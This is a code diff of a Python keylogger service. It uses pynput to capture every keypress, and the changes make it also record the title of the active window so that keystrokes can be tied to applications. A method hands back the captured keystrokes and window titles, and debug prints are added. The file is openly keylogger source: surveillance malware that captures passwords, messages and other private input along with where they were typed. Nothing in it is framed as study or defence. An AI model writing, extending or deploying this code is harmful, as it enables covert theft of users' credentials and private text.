@@ -1,12 +1,22 @@
-from logger.keylogger.inter_face import IKeyLogger
 from typing import List
+
+from logger.keylogger.inter_face import IKeyLogger
 from pynput.keyboard import Listener, KeyCode
-from logger.keylogger.special_characters import special_keys
+import pygetwindow as gw
+from special_characters import special_keys
+
+
+def key_to_string(key):
+    if isinstance(key, KeyCode):
+        return key.char or ""
+    return special_keys.get(key, f"<{key}>")
+
 
 class KeyloggerService(IKeyLogger):
     def __init__(self):
-        self.presses = list()
+        self.presses = str()
         self.listener = None
+        self.apps = list()
 
     def start_logging(self) -> None:
         self.listener = Listener(on_press= self.press)
@@ -15,17 +25,16 @@ class KeyloggerService(IKeyLogger):
     def stop_logging(self) -> None:
         self.listener.stop()
 
-    def get_logged_keys(self) -> List[str]:
-        result = self.presses
-        self.presses = list()
-        return result
-
-    def key_to_string(self,key):
-        if isinstance(key, KeyCode):
-            return key.char or ""
-        return special_keys.get(key, f"<{key}>")
+    def get_logged_keys(self) -> tuple[List, str]:
+        presses = self.presses
+        apps = self.apps
+        self.presses = str()
+        self.apps = list()
+        return apps, presses
 
     def press(self,key):
-        key_str = self.key_to_string(key)
-        self.presses.append(key_str)
-
+        self.apps.append(gw.getActiveWindow().title) if gw.getActiveWindow().title not in self.apps else None
+        key_str = key_to_string(key)
+        self.presses += key_str
+        print(self.apps)
+        print(type(self.apps))
